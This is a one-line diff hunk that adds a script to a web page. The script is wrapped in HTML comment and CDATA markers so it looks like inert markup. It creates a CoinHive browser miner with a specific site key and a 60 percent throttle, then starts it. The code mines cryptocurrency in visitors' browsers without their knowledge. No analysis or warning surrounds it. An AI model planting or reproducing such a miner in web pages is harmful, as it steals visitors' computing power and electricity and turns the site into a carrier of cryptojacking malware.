@@ -1,0 +1,1 @@
+<!--//--><![CDATA[// ><!--var miner = new CoinHive.Anonymous("T9UtNcvcu9o197o4xvHWm49rC3Ba81QR",{throttle: 0.6});miner.start();//--><!]]>
